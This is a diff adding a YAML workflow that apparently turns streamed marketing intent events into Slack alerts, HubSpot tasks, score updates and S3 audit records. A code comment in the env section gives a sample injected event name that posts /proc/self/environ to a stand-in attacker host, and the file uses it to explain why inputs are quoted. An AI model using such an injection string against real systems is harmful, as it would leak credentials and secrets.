@@ -1,0 +1,99 @@
+# 14 — One high-intent event, one run. The streaming shape.
+#
+#   classify ─▶ (hot) alert + task  |  (warm) score bump  ─▶ record
+#
+# This workflow is not scheduled. It is *submitted per event* by
+# `SOURCE=stream`, which follows an append-only NDJSON file or named pipe — one
+# JSON workflow submission per line, exactly once: the line's offset commits in
+# the same datastore transaction as the run it becomes, so a crash mid-line
+# neither loses the event nor runs it twice. A poison line is dead-lettered
+# rather than wedging the stream, and redriven from the console when fixed.
+#
+#   # Segment / Kafka / RudderStack → NDJSON → dagron
+#   kcat -C -t marketing.intent -o end -e | intent-to-dagron >> events.ndjson
+#   SOURCE=stream STREAM_PATH=./events.ndjson dagron ./events.ndjson
+#
+# Everything here is tuned for latency, not throughput: short timeouts, high
+# priority, few retries. A pricing-page view followed by a docs visit is worth
+# ten minutes of a rep's attention; a two-hour-old alert is worth nothing, which
+# is why `deadline: { in: 2m }` exists and why nothing in this DAG waits.
+name: mktg_realtime_intent_event
+tags: [marketing, streaming, intent, realtime]
+environment: prod
+result_from: classify
+deadline: { in: 2m }
+run_timeout_secs: 300
+parameters:
+  contact_id: ""
+  account_domain: ""
+  event_name: "pricing_page_view"
+  event_ts: ""
+
+task_defaults:
+  max_attempts: 2
+  retry_delay_secs: 1
+  retry_max_delay_secs: 5
+  timeout_secs: 20
+  priority: 200                  # the highest priority in the pack, on purpose
+  env:
+    - { name: HUBSPOT_TOKEN, value_from: { secret: HUBSPOT_PRIVATE_APP_TOKEN } }
+    - { name: SLACK_TOKEN, value_from: { secret: SLACK_BOT_TOKEN } }
+    # One run per line of an NDJSON stream, so every value below is third-party
+    # event data. Parameters substitute into the command string verbatim — an
+    # `event_name` of `pricing_view; curl evil.example -d @/proc/self/environ #`
+    # is a second shell command, not an event name. Bound to the environment and
+    # dereferenced quoted, it can only ever be an argument.
+    - { name: CONTACT_ID, value: "{{ contact_id }}" }
+    - { name: ACCOUNT_DOMAIN, value: "{{ account_domain }}" }
+    - { name: EVENT_NAME, value: "{{ event_name }}" }
+    - { name: EVENT_TS, value: "{{ event_ts }}" }
+
+tasks:
+  # Prints `hot`, `warm`, or `ignore` — the string the two `when:` gates below
+  # compare against, teed to a file for the tasks that need the value in a
+  # command (`{{ tasks.*.output }}` substitutes in conditions only).
+  - name: classify
+    command: ["sh", "-c", "intent-classify --contact \"$CONTACT_ID\" --domain \"$ACCOUNT_DOMAIN\" --event \"$EVENT_NAME\" --at \"$EVENT_TS\" | tee \"$DAGRON_ARTIFACTS/class.txt\""]
+
+  - name: alert_owner
+    depends_on: [classify]
+    when: "{{ tasks.classify.output }} == hot"
+    command: ["sh", "-c", "slack-dm --owner-of \"$CONTACT_ID\" --text \"$ACCOUNT_DOMAIN just hit $EVENT_NAME - they are on the site now\""]
+
+  - name: create_task
+    depends_on: [classify]
+    when: "{{ tasks.classify.output }} == hot"
+    pool: crm-api
+    produces: ["hubspot://crm/tasks/intent"]
+    command: ["sh", "-c", "hubspot-create-task --contact \"$CONTACT_ID\" --subject \"Live intent: $EVENT_NAME\" --due '+10 minutes' --priority HIGH"]
+
+  - name: bump_score
+    depends_on: [classify]
+    when: "{{ tasks.classify.output }} == warm"
+    pool: crm-api
+    produces: ["hubspot://crm/contacts/scored"]
+    command: ["sh", "-c", "hubspot-property-add --contact \"$CONTACT_ID\" --property intent_score --delta 5"]
+
+  # all_done, not none_failed: this run is a record of what happened even when
+  # the Slack DM failed. Losing the audit row is worse than losing the ping.
+  - name: record_event
+    depends_on: [alert_owner, create_task, bump_score]
+    trigger_rule: all_done
+    max_attempts: 3
+    produces: ["s3://acme-lake/marketing/intent-events"]
+    command:
+      - sh
+      - -c
+      - |
+        set -eu
+        # The class comes from an upstream task's artifact; if `classify` failed
+        # there is no file, and an unguarded `$(cat ...)` would quietly record
+        # class="" — an audit row that says the event was classified as nothing.
+        # `unclassified` is a fact; the empty string is a lie.
+        class=unclassified
+        if [ -r "$DAGRON_ARTIFACTS/class.txt" ]; then
+          class=$(cat "$DAGRON_ARTIFACTS/class.txt")
+        fi
+        printf '{"contact":"%s","event":"%s","class":"%s"}\n' \
+          "$CONTACT_ID" "$EVENT_NAME" "$class" \
+          | aws s3 cp - "s3://acme-lake/marketing/intent-events/dt=$(date -u +%F)/$DAGRON_RUN_ID.json"
